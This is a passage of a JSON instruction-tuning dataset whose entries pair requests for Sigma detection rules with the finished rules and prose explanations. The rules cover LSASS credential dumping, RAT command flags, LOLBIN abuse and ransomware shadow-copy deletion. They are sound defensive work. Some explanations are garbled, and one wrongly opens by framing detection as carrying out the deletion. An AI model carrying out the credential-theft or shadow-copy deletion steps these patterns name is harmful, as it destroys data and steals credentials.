    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|contains:\n            #- '0x1fffff' # Too many false positives\n            #- '0x01000'  # Too many false positives\n            #- '0x1010'   # Too many false positives\n            - '0x1038'\n            # - '0x40'   # Too many false positives\n            #- '0x1400'  # Too many false positives\n            # - '0x1410' # Too many false positives\n            - '0x1438'\n            - '0x143a'\n        CallTrace|contains:\n            - 'dbghelp.dll'\n            - 'dbgcore.dll'\n            - 'ntdll.dll'\n    filter_thor:\n        CallTrace|contains|all:\n            - '|C:\\Windows\\Temp\\asgard2-agent\\'\n            - '\\thor\\thor64.exe+'\n            - '|UNKNOWN('\n        GrantedAccess: '0x103800'\n    filter_sysmon:\n        SourceImage: 'C:\\Windows\\Sysmon64.exe'\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - False positives are present when looking for 0x1410. Exclusions may be required.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|contains:\n            #- '0x1fffff' # Too many false positives\n            #- '0x01000'  # Too many false positives\n            #- '0x1010'   # Too many false positives\n            - '0x1038'\n            # - '0x40'   # Too many false positives\n            #- '0x1400'  # Too many false positives\n            # - '0x1410' # Too many false positives\n            - '0x1438'\n            - '0x143a'\n        CallTrace|contains:\n            - 'dbghelp.dll'\n            - 'dbgcore.dll'\n            - 'ntdll.dll'\n    filter_thor:\n        CallTrace|contains|all:\n            - '|C:\\Windows\\Temp\\asgard2-agent\\'\n            - '\\thor\\thor64.exe+'\n            - '|UNKNOWN('\n        GrantedAccess: '0x103800'\n    filter_sysmon:\n        SourceImage: 'C:\\Windows\\Sysmon64.exe'\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - False positives are present when looking for 0x1410. Exclusions may be required.\nlevel: high\n",
      "question": "process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up.",
      "answer": "In order to detect process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up, you should: Focus on monitoring process access within Windows environments, specifically observing attempts to access the Local Security Authority Subsystem Service (lsass.exe). This involves looking for access patterns that include specific GrantedAccess flags such as '0x1038', '0x1438', and '0x143a'. These access flags are critical hints towards unauthorized or suspicious activities, intending to manipulate or dump the memory of the lsass.exe process, which is a common target for attackers seeking to extract sensitive authentication credentials.\n\nAdditionally, pay close attention to the Call Trace logs for indications that the access attempts involve significant system DLLs such as dbghelp.dll, dbgcore.dll, and ntdll.dll. These DLLs are typically employed in legitimate debugging activities but can be misused for dumping memory content, especially in the context of sophisticated credential theft attacks.\n\nTo minimize false positives and refine detection accuracy, it is advisable to consider the context and source of the process access attempt. For instance, filtering out events originating from known system management and monitoring tools or from within temporary directories commonly used by legitimate applications for extraction or temporary storage. This can be achieved by excluding access attempts linked to specific CallTraces like those originating from the C:\\Windows\\Temp\\ directory, or explicitly from Sysmon (System Monitor) activities, indicating the event was captured by a system monitoring tool rather than being an unauthorized access attempt.\n\nIt is also important to be aware of the potential for false positives, particularly with certain access codes, and to apply exclusions or additional scrutiny as needed to differentiate between malicious activities and legitimate system or administrative operations.\n\nBy carefully monitoring these signals and filtering out known benign activities, it's possible to significantly enhance the detection of unauthorized LSASS memory dumping attempts. These attempts are often indicators of advanced credential theft operations targeting Windows 10, Server 2016, and newer systems, employing tools like Mimikatz, NanoDump, and others specialized in extracting sensitive data."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Change to authentication method could be an indicator of an attacker adding an auth method to the account so they can have continued access..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to change to authentication method could be an indicator of an attacker adding an auth method to the account so they can have continued access, you should: Monitor Azure audit logs for entries that denote changes in authentication methods. Specifically, look for logs where the service logged is \"Authentication Methods\" within the \"UserManagement\" category, and the operation named \"User registered security info\". These are critical to identifying when a user's security information has been altered, which could indicate an unauthorized attempt to modify authentication methods, aiming for persistent access to an account. Be aware of false positives, which are currently unknown, signifying the importance of context in analysis. The severity of this activity is considered medium, highlighting its potential risk without suggesting immediate critical threat. This process is aligned with the MITRE ATT&CK framework, particularly focusing on tactics and techniques related to credential access and persistence through the manipulation of authentication mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        LoggedByService: 'Authentication Methods'\n        Category: 'UserManagement'\n        OperationName: 'User registered security info'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        LoggedByService: 'Authentication Methods'\n        Category: 'UserManagement'\n        OperationName: 'User registered security info'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Change to authentication method could be an indicator of an attacker adding an auth method to the account so they can have continued access.",
      "answer": "In order to change to authentication method could be an indicator of an attacker adding an auth method to the account so they can have continued access, you should: Monitor Azure audit logs for entries that denote changes in authentication methods. Specifically, look for logs where the service logged is \"Authentication Methods\" within the \"UserManagement\" category, and the operation named \"User registered security info\". These are critical to identifying when a user's security information has been altered, which could indicate an unauthorized attempt to modify authentication methods, aiming for persistent access to an account. Be aware of false positives, which are currently unknown, signifying the importance of context in analysis. The severity of this activity is considered medium, highlighting its potential risk without suggesting immediate critical threat. This process is aligned with the MITRE ATT&CK framework, particularly focusing on tactics and techniques related to credential access and persistence through the manipulation of authentication mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting unsigned module load by ClickOnce application..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unsigned module load by ClickOnce application, you should observe the process of image loading within Windows operating environments. Focus on instances where images are loaded from a path that includes '\\AppData\\Local\\Apps\\2.0\\'. Among these instances, attention should be further narrowed down to those where the loaded modules are either not digitally signed or have an expired signature. This is identified through checking the 'Signed' attribute for a value of 'false' and the 'SignatureStatus' for a value indicating that the signature has 'Expired'. Monitoring for these specific conditions across the specified paths allows for the detection of potentially malicious activity associated with the loading of unsigned or expired modules by ClickOnce applications. Given the targeted nature of this surveillance, instances triggering these conditions are considered to bear a medium threat level with unlikely chances of false positives. This strategy aligns with mitigation and detection techniques relevant to the MITRE ATT&CK framework, specifically addressing tactics and techniques related to the execution of unauthorized or compromised software components.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection_path:\n        Image|contains: '\\AppData\\Local\\Apps\\2.0\\'\n    selection_sig_status:\n        - Signed: 'false'\n        - SignatureStatus: 'Expired'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection_path:\n        Image|contains: '\\AppData\\Local\\Apps\\2.0\\'\n    selection_sig_status:\n        - Signed: 'false'\n        - SignatureStatus: 'Expired'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: medium\n",
      "question": "unsigned module load by ClickOnce application.",
      "answer": "In order to detect unsigned module load by ClickOnce application, you should observe the process of image loading within Windows operating environments. Focus on instances where images are loaded from a path that includes '\\AppData\\Local\\Apps\\2.0\\'. Among these instances, attention should be further narrowed down to those where the loaded modules are either not digitally signed or have an expired signature. This is identified through checking the 'Signed' attribute for a value of 'false' and the 'SignatureStatus' for a value indicating that the signature has 'Expired'. Monitoring for these specific conditions across the specified paths allows for the detection of potentially malicious activity associated with the loading of unsigned or expired modules by ClickOnce applications. Given the targeted nature of this surveillance, instances triggering these conditions are considered to bear a medium threat level with unlikely chances of false positives. This strategy aligns with mitigation and detection techniques relevant to the MITRE ATT&CK framework, specifically addressing tactics and techniques related to the execution of unauthorized or compromised software components."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of an \"svchost\" process with specific command line flags, that were seen present and used by ColdSteel RAT.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of an \"svchost\" process with specific command line flags, that were seen present and used by ColdSteel RAT, you should: Focus on monitoring process creation events within Windows environments. Specifically, pay attention to any instance where the process image name ends with '\\svchost.exe' and the command line ends with either ' -k msupdate', ' -k msupdate2', or ' -k alg'. These particular command line flags have been associated with the ColdSteel RAT, thus their presence could indicate a compromise. Considering the critical nature of this detection and the fact that false positives are unlikely, vigilance in tracking such process activities is paramount for maintaining security posture against such threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n        CommandLine|endswith:\n            - ' -k msupdate'\n            - ' -k msupdate2'\n            - ' -k alg'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n        CommandLine|endswith:\n            - ' -k msupdate'\n            - ' -k msupdate2'\n            - ' -k alg'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "creation of an \"svchost\" process with specific command line flags, that were seen present and used by ColdSteel RAT",
      "answer": "In order to detect the creation of an \"svchost\" process with specific command line flags, that were seen present and used by ColdSteel RAT, you should: Focus on monitoring process creation events within Windows environments. Specifically, pay attention to any instance where the process image name ends with '\\svchost.exe' and the command line ends with either ' -k msupdate', ' -k msupdate2', or ' -k alg'. These particular command line flags have been associated with the ColdSteel RAT, thus their presence could indicate a compromise. Considering the critical nature of this detection and the fact that false positives are unlikely, vigilance in tracking such process activities is paramount for maintaining security posture against such threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious ways to use the \"DumpMinitool.exe\" binary.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious ways to use the \"DumpMinitool.exe\" binary, you should focus on creating monitoring strategies tailored for process creation within Windows environments. The essence of detection lies in identifying processes initiated that end with specific strings: 'DumpMinitool.exe', 'DumpMinitool.x86.exe', and 'DumpMinitool.arm64.exe', coupled with ensuring these processes also have the correct original filename attributes matching the same names. This helps in distinguishing legitimate uses of the tool from potentially suspicious ones.\n\nNotably, there's a need to exclude certain directories from raising alerts, specifically those paths containing '\\Microsoft Visual Studio\\' or '\\Extensions\\', as the usage within these contexts could be considered legitimate given their association with development environments.\n\nAdditional scrutiny is necessary for command-line arguments accompanying the execution of these binaries. If the command line contains '.txt', indicating an operation involving text files, or flags such as 'Full', 'Mini', or 'WithHeap', without the specific '--dumpType' flag, it could signify an unusual or potentially malicious use of the tool, hence warranting further investigation.\n\nDespite the high level of concern, be aware that there might be unknown scenarios that could trigger false positives. Therefore, while the precision of these conditions is aimed at high-risk detections, maintaining an understanding that not all flagged situations may ultimately prove malicious is crucial. This approach aids in pinpointing activities related to reconnaissance, credential dumping, and other strategies adversaries might employ to exploit the 'DumpMinitool.exe' binary for malicious endeavors.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n            - '\\DumpMinitool.exe'\n            - '\\DumpMinitool.x86.exe'\n            - '\\DumpMinitool.arm64.exe'\n        - OriginalFileName:\n            - 'DumpMinitool.exe'\n            - 'DumpMinitool.x86.exe'\n            - 'DumpMinitool.arm64.exe'\n    filter_folder:\n        Image|contains:\n            - '\\Microsoft Visual Studio\\'\n            - '\\Extensions\\'  # https://github.com/microsoft/vstest/blob/b2e2126f1aa7e5753cafe9515563c99ade6a59ce/src/package/nuspec/Microsoft.TestPlatform.Portable.nuspec#L159\n    susp_flags:\n        CommandLine|contains: '.txt'\n    cmd_has_flags:\n        CommandLine|contains:\n            - ' Full'\n            - ' Mini'\n            - ' WithHeap'\n    filter_cmd_misses_flags:\n        CommandLine|contains: '--dumpType'\n    condition: selection and ( ( not filter_folder ) or susp_flags or ( cmd_has_flags and not filter_cmd_misses_flags ) )\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith:\n            - '\\DumpMinitool.exe'\n            - '\\DumpMinitool.x86.exe'\n            - '\\DumpMinitool.arm64.exe'\n        - OriginalFileName:\n            - 'DumpMinitool.exe'\n            - 'DumpMinitool.x86.exe'\n            - 'DumpMinitool.arm64.exe'\n    filter_folder:\n        Image|contains:\n            - '\\Microsoft Visual Studio\\'\n            - '\\Extensions\\'  # https://github.com/microsoft/vstest/blob/b2e2126f1aa7e5753cafe9515563c99ade6a59ce/src/package/nuspec/Microsoft.TestPlatform.Portable.nuspec#L159\n    susp_flags:\n        CommandLine|contains: '.txt'\n    cmd_has_flags:\n        CommandLine|contains:\n            - ' Full'\n            - ' Mini'\n            - ' WithHeap'\n    filter_cmd_misses_flags:\n        CommandLine|contains: '--dumpType'\n    condition: selection and ( ( not filter_folder ) or susp_flags or ( cmd_has_flags and not filter_cmd_misses_flags ) )\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious ways to use the \"DumpMinitool.exe\" binary",
      "answer": "In order to detect suspicious ways to use the \"DumpMinitool.exe\" binary, you should focus on creating monitoring strategies tailored for process creation within Windows environments. The essence of detection lies in identifying processes initiated that end with specific strings: 'DumpMinitool.exe', 'DumpMinitool.x86.exe', and 'DumpMinitool.arm64.exe', coupled with ensuring these processes also have the correct original filename attributes matching the same names. This helps in distinguishing legitimate uses of the tool from potentially suspicious ones.\n\nNotably, there's a need to exclude certain directories from raising alerts, specifically those paths containing '\\Microsoft Visual Studio\\' or '\\Extensions\\', as the usage within these contexts could be considered legitimate given their association with development environments.\n\nAdditional scrutiny is necessary for command-line arguments accompanying the execution of these binaries. If the command line contains '.txt', indicating an operation involving text files, or flags such as 'Full', 'Mini', or 'WithHeap', without the specific '--dumpType' flag, it could signify an unusual or potentially malicious use of the tool, hence warranting further investigation.\n\nDespite the high level of concern, be aware that there might be unknown scenarios that could trigger false positives. Therefore, while the precision of these conditions is aimed at high-risk detections, maintaining an understanding that not all flagged situations may ultimately prove malicious is crucial. This approach aids in pinpointing activities related to reconnaissance, credential dumping, and other strategies adversaries might employ to exploit the 'DumpMinitool.exe' binary for malicious endeavors."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of sigverif binary as a parent process which could indicate it being used as a LOLBIN to proxy execution.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of sigverif binary as a parent process which could indicate it being used as a LOLBIN to proxy execution, you should: Focus on monitoring process creation events within Windows operating environments. Specifically, keep an eye out for any instances where the sigverif.exe file is observed as a parent process in these events. This activity might be an indication of an adversary leveraging the sigverif executable as a Living Off The Land Binary (LOLBIN) to execute their malicious payload indirectly, making detection more challenging. It's noted that there are no well-defined circumstances under which this would be considered benign, although the reliability of this indicator may vary, thus it is assigned a medium severity level.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\sigverif.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\sigverif.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of sigverif binary as a parent process which could indicate it being used as a LOLBIN to proxy execution",
      "answer": "In order to detect the execution of sigverif binary as a parent process which could indicate it being used as a LOLBIN to proxy execution, you should: Focus on monitoring process creation events within Windows operating environments. Specifically, keep an eye out for any instances where the sigverif.exe file is observed as a parent process in these events. This activity might be an indication of an adversary leveraging the sigverif executable as a Living Off The Land Binary (LOLBIN) to execute their malicious payload indirectly, making detection more challenging. It's noted that there are no well-defined circumstances under which this would be considered benign, although the reliability of this indicator may vary, thus it is assigned a medium severity level."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code, you should monitor process creation logs on Windows. Specifically, look for processes where the image path ends with '\\Microsoft.Workflow.Compiler.exe' or the original file name is 'Microsoft.Workflow.Compiler.exe'. This detection focuses on identifying the execution of the Microsoft Workflow Compiler, an action that could indicate an attempt to execute arbitrary, potentially harmful, unsigned code on a system. You should also collect the command line and parent command line arguments for further analysis, as these might provide additional context about the execution. It's important to note that while there could be legitimate uses of the Microsoft Workflow Compiler, these are considered unlikely in modern enterprise environments, and thus, any invocation of this process should be treated with caution. The alert level for this detection is set to medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\Microsoft.Workflow.Compiler.exe'\n        - OriginalFileName: 'Microsoft.Workflow.Compiler.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate MWC use (unlikely in modern enterprise environments)\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\Microsoft.Workflow.Compiler.exe'\n        - OriginalFileName: 'Microsoft.Workflow.Compiler.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate MWC use (unlikely in modern enterprise environments)\nlevel: medium\n",
      "question": "invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code.",
      "answer": "In order to detect invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code, you should monitor process creation logs on Windows. Specifically, look for processes where the image path ends with '\\Microsoft.Workflow.Compiler.exe' or the original file name is 'Microsoft.Workflow.Compiler.exe'. This detection focuses on identifying the execution of the Microsoft Workflow Compiler, an action that could indicate an attempt to execute arbitrary, potentially harmful, unsigned code on a system. You should also collect the command line and parent command line arguments for further analysis, as these might provide additional context about the execution. It's important to note that while there could be legitimate uses of the Microsoft Workflow Compiler, these are considered unlikely in modern enterprise environments, and thus, any invocation of this process should be treated with caution. The alert level for this detection is set to medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell.\nScript being executed gets created as a temp file in /tmp folder with a scx* prefix.\nThen it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.\nThe file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell, you should focus on monitoring the process creation logs on Linux systems. Specifically, look for processes created by the root user (User: root) with a LogonId of 0, indicating a high level of privilege. Importantly, check whether the CurrentDirectory at the time of process initiation is '/var/opt/microsoft/scx/tmp', as this is a critical indicator of the SCX RunAsProvider's activity.\n\nPay close attention to the CommandLine field for any instances containing '/etc/opt/microsoft/scx/conf/tmpdir/scx', which suggests that a script with the 'scx*' prefix, created in the /tmp folder, is being executed. This action is a key behavior of the SCX RunAsProvider ExecuteScript function, utilized in various Microsoft products for UNIX/Linux scripting operations.\n\nBe aware that there could be legitimate uses of the SCX RunAsProvider ExecuteScript, so it's essential to discern between normal administrative actions and potential malicious activities. Such determinations should be made cautiously to avoid false alarms.\n\nThe detection of these activities is critical, given the high level of access and the potential for misusing the SCXcore component within Microsoft's operational management tools. Monitoring for these specific conditions will help identify unauthorized script executions, which could lead to higher privileges being exploited or malicious scripts impacting the UNIX/Linux systems managed through SCXcore.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        User: root\n        LogonId: 0\n        CurrentDirectory: '/var/opt/microsoft/scx/tmp'\n        CommandLine|contains: '/etc/opt/microsoft/scx/conf/tmpdir/scx'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SCX RunAsProvider ExecuteScript.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        User: root\n        LogonId: 0\n        CurrentDirectory: '/var/opt/microsoft/scx/tmp'\n        CommandLine|contains: '/etc/opt/microsoft/scx/conf/tmpdir/scx'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SCX RunAsProvider ExecuteScript.\nlevel: high\n",
      "question": "Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell.\nScript being executed gets created as a temp file in /tmp folder with a scx* prefix.\nThen it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.\nThe file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including\nMicrosoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.\n",
      "answer": "In order to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell, you should focus on monitoring the process creation logs on Linux systems. Specifically, look for processes created by the root user (User: root) with a LogonId of 0, indicating a high level of privilege. Importantly, check whether the CurrentDirectory at the time of process initiation is '/var/opt/microsoft/scx/tmp', as this is a critical indicator of the SCX RunAsProvider's activity.\n\nPay close attention to the CommandLine field for any instances containing '/etc/opt/microsoft/scx/conf/tmpdir/scx', which suggests that a script with the 'scx*' prefix, created in the /tmp folder, is being executed. This action is a key behavior of the SCX RunAsProvider ExecuteScript function, utilized in various Microsoft products for UNIX/Linux scripting operations.\n\nBe aware that there could be legitimate uses of the SCX RunAsProvider ExecuteScript, so it's essential to discern between normal administrative actions and potential malicious activities. Such determinations should be made cautiously to avoid false alarms.\n\nThe detection of these activities is critical, given the high level of access and the potential for misusing the SCXcore component within Microsoft's operational management tools. Monitoring for these specific conditions will help identify unauthorized script executions, which could lead to higher privileges being exploited or malicious scripts impacting the UNIX/Linux systems managed through SCXcore."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting known malicious service installs that only appear in cases of lateral movement, credential dumping, and other suspicious activities..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect known malicious service installs that only appear in cases of lateral movement, credential dumping, and other suspicious activities, you should monitor the Windows System logs, particularly focusing on events from the Service Control Manager with EventID 7045. This event indicates service installations, which can be leveraged by attackers for various purposes such as executing lateral movement within a network or dumping credentials.\n\nYou will need to look for specific indicators within the logs to identify potentially malicious activities. These include:\n\n1. Any service installation where the ImagePath contains the '\\PAExec' string. PAExec is a tool that can be used for executing processes on other systems, which is commonly utilized in lateral movement.\n\n2. Services named 'mssecsvc2.0'; this service name is infamously associated with the WannaCry ransomware, indicating a highly malicious activity.\n\n3. Service installations that contain 'net user' in the ImagePath. This is often used for creating or modifying user accounts on the local system or domain, which can be an indicator of attempts to establish persistence or perform credential dumping.\n\n4. The installation of a service named 'Java(TM) Virtual Machine Support Service'. This service name can be indicative of attacks carried out by sophisticated threat actors, such as APT29, who often disguise their malware as legitimate services to avoid detection.\n\nIt's critical to approach detection with the understanding that there could be unknown false positives, given the nature of these indicators. Any match should be subjected to a critical level of scrutiny due to the potential impact of these threats. The associated tactics and techniques from the MITRE ATT&CK framework for these activities include Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Lateral Movement, and Execution.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    malsvc_paexec:\n        ImagePath|contains: '\\PAExec'\n    malsvc_wannacry:\n        ServiceName: 'mssecsvc2.0'\n    malsvc_persistence:\n        ImagePath|contains: 'net user'\n    malsvc_apt29:\n        ServiceName: 'Java(TM) Virtual Machine Support Service'\n    condition: selection and 1 of malsvc_*\nfalsepositives:\n    - Unknown\nlevel: critical\nstatus: unsupported",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    malsvc_paexec:\n        ImagePath|contains: '\\PAExec'\n    malsvc_wannacry:\n        ServiceName: 'mssecsvc2.0'\n    malsvc_persistence:\n        ImagePath|contains: 'net user'\n    malsvc_apt29:\n        ServiceName: 'Java(TM) Virtual Machine Support Service'\n    condition: selection and 1 of malsvc_*\nfalsepositives:\n    - Unknown\nlevel: critical\nstatus: unsupported",
      "question": "known malicious service installs that only appear in cases of lateral movement, credential dumping, and other suspicious activities.",
      "answer": "In order to detect known malicious service installs that only appear in cases of lateral movement, credential dumping, and other suspicious activities, you should monitor the Windows System logs, particularly focusing on events from the Service Control Manager with EventID 7045. This event indicates service installations, which can be leveraged by attackers for various purposes such as executing lateral movement within a network or dumping credentials.\n\nYou will need to look for specific indicators within the logs to identify potentially malicious activities. These include:\n\n1. Any service installation where the ImagePath contains the '\\PAExec' string. PAExec is a tool that can be used for executing processes on other systems, which is commonly utilized in lateral movement.\n\n2. Services named 'mssecsvc2.0'; this service name is infamously associated with the WannaCry ransomware, indicating a highly malicious activity.\n\n3. Service installations that contain 'net user' in the ImagePath. This is often used for creating or modifying user accounts on the local system or domain, which can be an indicator of attempts to establish persistence or perform credential dumping.\n\n4. The installation of a service named 'Java(TM) Virtual Machine Support Service'. This service name can be indicative of attacks carried out by sophisticated threat actors, such as APT29, who often disguise their malware as legitimate services to avoid detection.\n\nIt's critical to approach detection with the understanding that there could be unknown false positives, given the nature of these indicators. Any match should be subjected to a critical level of scrutiny due to the potential impact of these threats. The associated tactics and techniques from the MITRE ATT&CK framework for these activities include Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Lateral Movement, and Execution."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to delete Windows Volume Shadow Copies with PowerShell code and Get-WMIObject, a technique used by numerous ransomware families such as Sodinokibi/REvil, you should: Monitor PowerShell script logs, ensuring the Script Block Logging feature is enabled, to detect the use of PowerShell commands that query 'Win32_Shadowcopy' via 'Get-WmiObject', and subsequently call '.Delete()' on it. This activity is highly indicative of an attack aiming to prevent system recovery by deleting shadow copies, which is a common step in the operation of ransomware. Detection focuses on the presence of these specific command components within scripts, highlighting potential compromise attempts. Be vigilant for false positives, although they are currently unspecified, and consider these detections as high priority due to the severity of the potential impact associated with ransomware attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Get-WmiObject'\n            - 'Win32_Shadowcopy'\n            - '.Delete()'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Get-WmiObject'\n            - 'Win32_Shadowcopy'\n            - '.Delete()'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil",
      "answer": "In order to delete Windows Volume Shadow Copies with PowerShell code and Get-WMIObject, a technique used by numerous ransomware families such as Sodinokibi/REvil, you should: Monitor PowerShell script logs, ensuring the Script Block Logging feature is enabled, to detect the use of PowerShell commands that query 'Win32_Shadowcopy' via 'Get-WmiObject', and subsequently call '.Delete()' on it. This activity is highly indicative of an attack aiming to prevent system recovery by deleting shadow copies, which is a common step in the operation of ransomware. Detection focuses on the presence of these specific command components within scripts, highlighting potential compromise attempts. Be vigilant for false positives, although they are currently unspecified, and consider these detections as high priority due to the severity of the potential impact associated with ransomware attacks."
    }
  },
  {
